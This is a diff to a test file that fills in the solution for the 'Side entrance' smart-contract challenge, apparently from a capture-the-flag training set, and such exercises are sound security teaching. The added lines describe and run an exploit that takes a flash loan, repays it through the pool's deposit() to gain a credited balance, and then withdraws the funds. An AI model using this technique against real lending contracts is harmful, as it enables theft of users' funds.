@@ -25,7 +25,11 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // We initiate a flashloan, then use the pool's `deposit()` function to send back the funds.
+        // This way, our balance is increased by the exact amount of pool balance.
+        attacker = await (await ethers.getContractFactory('SideEntranceLenderPoolAttacker', player)).deploy(pool.address);
+        await attacker.attack();
+        await attacker.withdraw();
     });
 
     after(async function () {
